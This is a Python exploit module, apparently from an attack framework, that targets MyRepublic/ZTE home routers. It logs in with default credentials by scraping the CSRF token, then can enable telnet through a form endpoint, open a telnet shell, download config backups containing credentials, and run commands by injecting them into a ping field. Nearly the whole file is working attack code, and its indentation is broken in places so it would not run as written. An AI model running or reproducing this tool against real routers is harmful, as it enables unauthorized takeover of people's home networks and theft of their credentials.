#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MyRepublic Router Multi-Exploit Module
FINAL VERSION: CSRF Token + Login + Telnet + RCE
"""

import requests
import socket
import time
import re
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MODULE_INFO = {
    "name": "MyRepublic Router Multi-Exploit",
    "description": "CSRF Token → Login → Telnet → RCE",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "arch": "arm,mips",
    "rank": "Excellent",
    "references": ["MyRepublic ONT", "ZTE F609/F660", "CSRF Bypass"]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.1.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
    "USERNAME": {"description": "Username", "required": False, "default": "user"},
    "PASSWORD": {"description": "Password", "required": False, "default": "user1234"},
    "MODE": {
        "description": "Exploit mode",
        "required": False,
        "default": "detect",
        "choices": ["detect", "backdoor", "credentials", "telnet", "rce", "full"]
    },
    "CMD": {"description": "Command", "required": False, "default": "id"},
    "TELNET_PORT": {"description": "Telnet port", "required": False, "default": "23"},
}

# Kredensial utama
MYREPUBLIC_CREDS = [("user", "user1234"), ("admin", "admin")]

# Signature publik
PUBLIC_SIGNATURES = ["myrepublic", "zte", "f609", "f660", "hg8245", "login", "boa"]

class MyRepublicExploit:
    def __init__(self, target, port=80, proto="http", username="user", password="user1234", cmd="id", telnet_port=23):
        self.target = target
        self.port = port
        self.proto = proto
        self.username = username
        self.password = password
        self.cmd = cmd
        self.telnet_port = telnet_port
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        self.logged_in = False

    # ===================================================================
    # DETEKSI TANPA LOGIN
    # ===================================================================
    def detect_device(self):
        console.print("\n[bold yellow]======== MyRepublic DETECTION ========[/bold yellow]")
        device_info = {
            'is_myrepublic': False,
            'model': 'Unknown',
            'vulnerable': False,
            'patched': True,
            'brand': 'Unknown'
        }
        try:
            r = self.session.get(f"{self.base_url}/", timeout=10)
            html = r.text.lower()
            matches = [s for s in PUBLIC_SIGNATURES if s in html]
            if matches:
                device_info['is_myrepublic'] = True
                device_info['brand'] = 'MyRepublic'
                console.print(f"[green]MyRepublic detected: {', '.join(matches)}[/green]")
            # 2. LOGIN DULU UNTUK BACA MODEL
            if self.try_login():
                console.print("[yellow][*] Logged in → scanning internal pages...[/yellow]")
                for page in ["/menu.html", "/status.html", "/deviceinfo", "/system_status"]:
                    try:
                       r_page = self.session.get(f"{self.base_url}{page}", timeout=8)
                       if r_page.status_code == 200:
                          page_html = r_page.text
                          model_match = re.search(r'(f6\d{2}|hg\d{4}[a-z]?|zxhn\s*h\d+)', page_html, re.I)
                          if model_match:
                             device_info['model'] = model_match.group(0).upper()
                             console.print(f"[bold green]MODEL DETECTED: {device_info['model']} (from {page})[/bold green]")
                             break
                          if "device model" in page_html.lower():
                             model_line = re.search(r'device model[^<]*<[^>]*>([^<]+)', page_html, re.I)
                          if model_line:
                             device_info['model'] = model_line.group(1).strip().upper()
                             console.print(f"[bold green]MODEL: {device_info['model']} (from table)[/bold green]")
                             break
                   except: continue
            else:
                console.print("[yellow]Login failed → model scan skipped[/yellow]")
            device_info['vulnerable'] = device_info['is_myrepublic']
            device_info['patched'] = not device_info['vulnerable']

            return device_info
     except Exception as e:
         console.print(f"[red]Detection error: {e}[/red]")
         return device_info


    # ===================================================================
    # CEK BACKDOOR PUBLIK
    # ===================================================================
    def test_backdoors(self):
        console.print("[bold yellow][*] Scanning public backdoor endpoints...[/bold yellow]")
        backdoors = []
        endpoints = ["/debug", "/cgi-bin/debug", "/backdoor", "/technician", "/support"]
        for ep in endpoints:
            try:
                url = f"{self.base_url}{ep}"
                r = self.session.head(url, timeout=5)
                if r.status_code in [200, 401, 403]:
                    console.print(f"[yellow]Potential backdoor: {ep} (HTTP {r.status_code})[/yellow]")
                    backdoors.append(ep)
            except: pass
        return backdoors

    # ===================================================================
    # LOGIN DENGAN CSRF TOKEN (PASTI SUKSES!)
    # ===================================================================
    def try_login(self):
        if self.logged_in:
            return True

        console.print("[bold yellow][*] Fetching /login.html for CSRF token...[/bold yellow]")
        login_url = f"{self.base_url}/login.html"

        try:
            # 1. Ambil halaman login
            r = self.session.get(login_url, timeout=10)
            if r.status_code != 200:
                console.print("[red]Cannot access /login.html[/red]")
                return False

            html = r.text

            # 2. Ekstrak semua hidden input
            hidden_inputs = {}
            for match in re.finditer(r'<input[^>]+type=["\']hidden["\'][^>]*>', html, re.I):
                name = re.search(r'name=["\']([^"\']+)["\']', match.group(0))
                value = re.search(r'value=["\']([^"\']*)["\']', match.group(0))
                if name:
                    hidden_inputs[name.group(1)] = value.group(1) if value else ""

            console.print(f"[cyan]Found hidden fields: {list(hidden_inputs.keys())}[/cyan]")

            # 3. Coba login dengan token
            payloads = [
                {"username": "user", "password": "user1234"},
                {"user": "user", "pwd": "user1234"}
            ]

            for base_payload in payloads:
                payload = base_payload.copy()
                payload.update(hidden_inputs)
                payload["submit"] = "Login"

                console.print(f"[yellow]POST → {login_url}[/yellow]")
                console.print(f"[cyan]Payload: {payload}[/cyan]")

                r_post = self.session.post(login_url, data=payload, timeout=10, allow_redirects=True)

                # 4. Cek login berhasil
                if r_post.status_code in [200, 302]:
                    if "login" not in r_post.url.lower():
                        console.print(f"[bold green]LOGIN SUCCESS! → {r_post.url}[/bold green]")
                        self.logged_in = True
                        return True
                    if any(x in r_post.text.lower() for x in ["logout", "status", "dashboard", "welcome"]):
                        console.print(f"[bold green]LOGIN SUCCESS: {base_payload}[/bold green]")
                        self.logged_in = True
                        return True

            console.print("[red]All login attempts failed[/red]")
            return False

        except Exception as e:
            console.print(f"[red]Login error: {str(e)}[/red]")
            return False

    # ===================================================================
    # ENABLE TELNET SETELAH LOGIN
    # ===================================================================
    def exploit_backdoor(self):
        if not self.try_login():
            console.print("[yellow]Trying Telnet enable without login...[/yellow]")

        console.print("[bold yellow][*] Sending Telnet enable request...[/bold yellow]")
        url = f"{self.base_url}/goform/formTelnet"
        data = {
            "telnetd_enable": "1",
            "save": "Apply"
        }
        try:
            r = self.session.post(url, data=data, timeout=10)
            if r.status_code == 200:
                console.print(f"[green]Telnet enable request sent: {url}[/green]")
                return True
        except: pass
        console.print("[red]Failed to enable Telnet[/red]")
        return False

    # ===================================================================
    # TUNGGU PORT 23 TERBUKA
    # ===================================================================
    def wait_for_telnet(self, timeout=30):
        console.print(f"[bold yellow]Waiting up to {timeout}s for Telnet port {self.telnet_port}...[/bold yellow]")
        for i in range(timeout):
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect((self.target, self.telnet_port))
                s.close()
                console.print(f"[green]Telnet port OPEN after {i+1}s[/green]")
                return True
            except:
                time.sleep(1)
                if i % 5 == 0 and i > 0:
                    console.print(f"[yellow]Still waiting... ({i}s)[/yellow]")
        console.print("[red]Telnet port never opened[/red]")
        return False

    # ===================================================================
    # TELNET SHELL
    # ===================================================================
    def test_telnet_backdoors(self):
        if not self.wait_for_telnet(timeout=30):
            console.print("[red]Telnet service not started[/red]")
            return False

        console.print("[bold yellow]Connecting to Telnet with user:user1234...[/bold yellow]")
        try:
            s = socket.socket()
            s.settimeout(12)
            s.connect((self.target, self.telnet_port))

            s.sendall(b"user\n")
            time.sleep(1)
            s.sendall(b"user1234\n")
            time.sleep(2)
            s.sendall(b"id\n")
            time.sleep(3)

            output = b""
            for _ in range(10):
                try:
                    data = s.recv(4096)
                    if not data: break
                    output += data
                except:
                    break
            output = output.decode(errors='ignore')

            if "uid=" in output:
                console.print("[bold green]TELNET SHELL GAINED![/bold green]")
                show_output(output)
                s.close()
                return True
            s.close()
        except Exception as e:
            console.print(f"[red]Telnet login failed: {e}[/red]")

        console.print("[red]Telnet backdoor failed[/red]")
        return False

    # ===================================================================
    # DUMP CONFIG
    # ===================================================================
    def dump_credentials(self):
        if not self.logged_in:
            console.print("[yellow]Skipping config dump (not logged in)[/yellow]")
            return False
        console.print("[bold yellow][*] Dumping config...[/bold yellow]")
        urls = [f"{self.base_url}/backup.cfg", f"{self.base_url}/config.bin"]
        for url in urls:
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.content) > 100:
                    filename = url.split("/")[-1]
                    Path(filename).write_bytes(r.content)
                    console.print(f"[green]Saved: {filename} ({len(r.content)} bytes)[/green]")
                    return True
            except: pass
        console.print("[red]No config found[/red]")
        return False

    # ===================================================================
    # RCE
    # ===================================================================
    def exploit_rce(self):
        if not self.logged_in:
            console.print("[yellow]Skipping RCE (not logged in)[/yellow]")
            return False
        console.print("[bold yellow][*] Attempting RCE...[/bold yellow]")
        endpoints = ["/goform/formPing", "/cgi-bin/luci/admin/network/diagnostic"]
        for ep in endpoints:
            try:
                url = f"{self.base_url}{ep}"
                data = {"ping_address": f"127.0.0.1; {self.cmd}"}
                r = self.session.post(url, data=data, timeout=10)
                if "uid=" in r.text:
                    console.print(f"[green]RCE Success: {ep}[/green]")
                    show_output(r.text.strip())
                    return True
            except: pass
        console.print("[red]RCE failed[/red]")
        return False

# ===================================================================
# DISPLAY
# ===================================================================
def show_info():
    table = Table(show_header=False, box=None)
    table.add_column("Field", style="bold yellow")
    table.add_column("Value", style="white")
    table.add_row("Name", MODULE_INFO["name"])
    table.add_row("Feature", "CSRF Token + Login + Telnet + RCE")
    table.add_row("Risk", "High")
    console.print(Panel(table, title="MyRepublic Exploit", border_style="red"))

def show_options(opts):
    table = Table(title="Options", box=None)
    table.add_column("Name", style="bold cyan")
    table.add_column("Value", style="green")
    table.add_column("Req", style="yellow")
    table.add_column("Desc", style="white")
    for k, v in opts.items():
        val = v.get('value', v.get('default', ''))
        req = "yes" if v.get('required') else "no"
        table.add_row(k, str(val), req, v.get('description', ''))
    console.print(Panel(table, border_style="blue"))

def show_output(text):
    if text and text.strip():
        syntax = Syntax(text.strip(), "bash", theme="monokai", line_numbers=True)
        console.print(Panel(syntax, title="Output", border_style="green"))

# ===================================================================
# MAIN RUN
# ===================================================================
def run(session, options):
    show_info()
    current = {k: {**v, 'value': options.get(k, v.get('default'))} for k, v in OPTIONS.items()}
    show_options(current)

    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http")
    mode = options.get("MODE", "detect").lower()
    cmd = options.get("CMD", "id")
    telnet_port = int(options.get("TELNET_PORT", "23"))

    console.print(f"\n[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
    console.print(f"[bold yellow][*] Mode: {mode.upper()}[/bold yellow]")

    try:
        exploit = MyRepublicExploit(rhost, rport, proto, cmd=cmd, telnet_port=telnet_port)

        # DETEKSI
        device_info = exploit.detect_device()
        console.print("\n[bold yellow]=== DETECTION RESULTS ===[/bold yellow]")
        console.print(f"Device Type: {device_info['brand']}")
        console.print(f"Model: {device_info['model']}")
        console.print(f"MyRepublic Device: {'Yes' if device_info['is_myrepublic'] else 'No'}")
        console.print(f"Vulnerable: {'Yes' if device_info['vulnerable'] else 'No'}")
        console.print(f"Patched: {'Yes' if device_info['patched'] else 'No'}")

        if not device_info['is_myrepublic'] and mode != "detect":
            cont = input("\nContinue anyway? (y/N): ").strip().lower()
            if cont != 'y':
                console.print("[yellow]Aborted.[/yellow]")
                return False

        if mode == "detect":
            console.print("\n[bold green]Detection completed[/bold green]")
            return True

        # EKSEKUSI MODE
        if mode == "backdoor":
            exploit.exploit_backdoor()
        elif mode == "credentials":
            exploit.dump_credentials()
        elif mode == "telnet":
            exploit.test_telnet_backdoors()
        elif mode == "rce":
            exploit.exploit_rce()
        elif mode == "full":
            if exploit.try_login():
                exploit.exploit_backdoor()
                exploit.dump_credentials()
                exploit.test_telnet_backdoors()
                exploit.exploit_rce()
            else:
                console.print("[yellow]Login failed, trying Telnet anyway...[/yellow]")
                exploit.exploit_backdoor()
                exploit.test_telnet_backdoors()

        console.print(f"\n[bold green][+] {mode.upper()} mode completed![/bold green]")
        return True

    except Exception as e:
        console.print(f"[bold red][-] Error: {str(e)}[/bold red]")
        return False
